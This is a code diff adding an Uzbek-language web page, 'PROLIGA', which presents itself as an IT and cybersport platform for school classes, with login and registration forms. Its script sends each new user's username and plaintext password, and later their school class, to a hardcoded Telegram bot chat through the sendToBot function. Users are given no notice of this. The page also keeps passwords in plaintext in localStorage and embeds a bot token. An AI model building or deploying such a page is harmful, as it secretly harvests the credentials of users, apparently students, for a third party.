@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PROLIGA</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family: Arial,sans-serif;}
+body{background:linear-gradient(120deg,#0f2027,#203a43,#000);color:#fff;}
+header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;}
+.logo{font-size:22px;font-weight:bold;letter-spacing:2px;}
+.menu button{font-size:14px;margin-left:10px;cursor:pointer;padding:8px 14px;border-radius:8px;border:none;background:linear-gradient(120deg,#5f2cff,#00d4ff);color:#fff;transition:0.3s;}
+.menu button:hover{transform:scale(1.05);}
+.banner{margin:15px;padding:25px;border-radius:16px;background:linear-gradient(120deg,#5f2cff,#00d4ff);animation:fadeIn 0.4s ease-out;}
+.banner h2{font-size:20px;margin-bottom:10px;}
+.banner p{font-size:14px;opacity:0.9;}
+.section{margin:20px 15px;}
+.section h3{margin-bottom:12px;}
+.cards{display:flex;gap:14px;}
+.card{flex:1;background:#111;border-radius:16px;padding:18px;position:relative;overflow:hidden;cursor:pointer;animation:slideUp 0.45s ease;transition:0.3s;}
+.card:hover{transform:scale(1.06);}
+.card::before{content:"";position:absolute;inset:0;background:linear-gradient(120deg,transparent,rgba(255,255,255,0.15),transparent);left:-100%;transition:0.25s;}
+.card:hover::before{left:100%;}
+.card img{width:100%;height:90px;object-fit:cover;border-radius:12px;margin-bottom:12px;}
+.card h4{text-align:center;}
+.it{border:1px solid #00ffff;}
+.cyber{border:1px solid #ff0066;}
+footer{position:fixed;bottom:0;left:0;right:0;background:#050505;display:flex;justify-content:space-around;padding:12px 0;}
+footer div{font-size:13px;opacity:0.8;}
+.modal-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:center;z-index:1000;animation:fadeIn 0.3s ease;}
+.modal{background:#1a1a1a;padding:30px 25px;border-radius:16px;width:320px;text-align:center;box-shadow:0 10px 25px rgba(0,0,0,0.5);animation:slideUp 0.3s ease;}
+.modal h3{margin-bottom:20px;font-size:22px;color:#fff;}
+.modal input{width:100%;padding:12px;margin:10px 0;border-radius:10px;border:1px solid #555;background:#222;color:#fff;font-size:14px;}
+.modal input:focus{outline:none;border-color:#5f2cff;box-shadow:0 0 8px #5f2cff;}
+.modal button{width:100%;padding:12px;margin-top:15px;border:none;border-radius:10px;background:linear-gradient(120deg,#5f2cff,#00d4ff);color:#fff;font-size:16px;cursor:pointer;transition:0.3s;}
+.modal button:hover{transform:scale(1.05);box-shadow:0 5px 15px rgba(95,44,255,0.5);}
+#modal-msg{margin-top:12px;font-size:13px;color:#f55;}
+#confirm-class-btn{display:none;padding:6px 12px;border:none;border-radius:6px;background:linear-gradient(120deg,#5f2cff,#00d4ff);color:#fff;cursor:pointer;}
+@keyframes fadeIn{from{opacity:0; transform:translateY(20px)}to{opacity:1; transform:translateY(0)}}
+@keyframes slideUp{from{opacity:0; transform:translateY(30px)}to{opacity:1; transform:translateY(0)}}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo">PROLIGA</div>
+  <div class="menu" id="menu">
+    <button onclick="openModal('login')">Kirish</button>
+    <button onclick="openModal('register')">Ro‘yxatdan o‘tish</button>
+  </div>
+  <div id="welcome-area" style="display:flex;align-items:center;gap:10px;">
+    <div id="welcome-msg" style="display:none;font-size:16px;color:#0ff;"></div>
+    <button id="confirm-class-btn" onclick="confirmClass()">Sinfni tasdiqlash</button>
+  </div>
+</header>
+
+<div class="banner">
+  <h2>PROLIGA PLATFORMASI</h2>
+  <p>IT va Cybersport yo‘nalishlari uchun zamonaviy tizim</p>
+</div>
+
+<div class="section">
+  <h3>Bo‘limlar</h3>
+  <div class="cards">
+    <div class="card it" id="it-card" onclick="selectSection('it')">
+      <img src="https://images.unsplash.com/photo-1518770660439-4636190af475">
+      <h4>IT BO‘LIMI</h4>
+    </div>
+    <div class="card cyber" id="cyber-card" onclick="selectSection('cyber')">
+      <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e">
+      <h4>CYBERSPORT</h4>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div>Main</div>
+  <div>IT</div>
+  <div>Cyber</div>
+  <div>Profile</div>
+</footer>
+
+<div class="modal-bg" id="modal-bg">
+  <div class="modal" id="modal">
+    <h3 id="modal-title">Kirish</h3>
+    <input type="text" id="username" placeholder="Ism">
+    <input type="password" id="password" placeholder="Parol">
+    <button onclick="submitForm()">Tasdiqlash</button>
+    <p id="modal-msg"></p>
+  </div>
+</div>
+
+<script>
+// Telegram Bot sozlamalari
+const BOT_TOKEN = "8326245075:AAGaTnieB640tbfgv8s_0t0uXKUtRQ8dUjk";  // bot token
+const CHAT_ID = "8074394669";          // chat ID
+
+let users = JSON.parse(localStorage.getItem('users')||'{}');
+let currentAction = 'login';
+let currentUser = null;
+
+function openModal(action){
+  currentAction = action;
+  document.getElementById('modal-bg').style.display = 'flex';
+  document.getElementById('modal-title').innerText = action==='login'?'Kirish':'Ro‘yxatdan o‘tish';
+  document.getElementById('modal-msg').innerText = '';
+  document.getElementById('username').value = '';
+  document.getElementById('password').value = '';
+}
+
+function submitForm(){
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const msg = document.getElementById('modal-msg');
+
+  if(username===''||password===''){
+    msg.style.color='#f55';
+    msg.innerText='Iltimos, barcha maydonlarni to‘ldiring!';
+    return;
+  }
+
+  if(currentAction==='register'){
+    if(users[username]){
+      msg.style.color='#f55';
+      msg.innerText='Foydalanuvchi allaqachon mavjud!';
+    } else {
+      users[username]=password;
+      localStorage.setItem('users', JSON.stringify(users));
+      currentUser=username;
+      showWelcome(username);
+      sendToBot(username,password); // ro‘yxatdan o‘tishda yuborish
+      msg.style.color='lime';
+      msg.innerText='Ro‘yxatdan o‘tish muvaffaqiyatli!';
+      setTimeout(()=>document.getElementById('modal-bg').style.display='none',500);
+    }
+  } else { // login
+    if(users[username] && users[username]===password){
+      currentUser=username;
+      showWelcome(username);
+      document.getElementById('modal-bg').style.display='none';
+    } else {
+      msg.style.color='#f55';
+      msg.innerText='Ism yoki parol xato!';
+    }
+  }
+}
+
+function showWelcome(username){
+  document.getElementById('menu').style.display='none';
+  const welcome=document.getElementById('welcome-msg');
+  const confirmBtn=document.getElementById('confirm-class-btn');
+  welcome.style.display='block';
+  
+  const userClass = localStorage.getItem('userClass_'+username);
+  if(userClass){
+    welcome.innerText='Xush kelibsiz, '+username+' ('+userClass+')';
+    confirmBtn.style.display='none';
+  } else {
+    welcome.innerText='Xush kelibsiz, '+username;
+    confirmBtn.style.display='inline-block';
+  }
+}
+
+// Sinfni tasdiqlash tugmasi
+function confirmClass(){
+  if(!currentUser) return;
+  const className = prompt("Sinfingizni kiriting (masalan: 10A):");
+  if(className && className.trim()!==''){
+    localStorage.setItem('userClass_'+currentUser,className.trim());
+    showWelcome(currentUser);
+    alert('Sinf tasdiqlandi: '+className);
+    // Botga yuborish
+    sendToBot(currentUser, users[currentUser], className.trim());
+  }
+}
+
+// Botga yuborish
+function sendToBot(username,password,userClass=null){
+  let text = `Yangi foydalanuvchi ro‘yxatdan o‘tdi:\nIsm: ${username}\nParol: ${password}`;
+  if(userClass) text += `\nSinf: ${userClass}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({chat_id: CHAT_ID, text:text})
+  })
+  .then(res=>console.log('Botga yuborildi'))
+  .catch(err=>console.log(err));
+}
+
+// Bo‘limni tanlash
+function selectSection(section){
+  const itCard=document.getElementById('it-card');
+  const cyberCard=document.getElementById('cyber-card');
+
+  if(section==='it'){
+    itCard.style.opacity='1';
+    cyberCard.style.opacity='0.5';
+    cyberCard.style.pointerEvents='none';
+    alert('IT bo‘limiga o‘tildi');
+  } else {
+    cyberCard.style.opacity='1';
+    itCard.style.opacity='0.5';
+    itCard.style.pointerEvents='none';
+    alert('Cybersport bo‘limiga o‘tildi');
+  }
+}
+
+document.getElementById('modal-bg').addEventListener('click', function(e){
+  if(e.target===this){ this.style.display='none'; }
+});
+
+// Agar localStorageda foydalanuvchi mavjud bo‘lsa welcome ko‘rsatish
+const savedUsers = Object.keys(users);
+if(savedUsers.length>0){
+  const lastUser = savedUsers[savedUsers.length-1];
+  currentUser=lastUser;
+  showWelcome(lastUser);
+}
+</script>
+
+</body>
+</html>
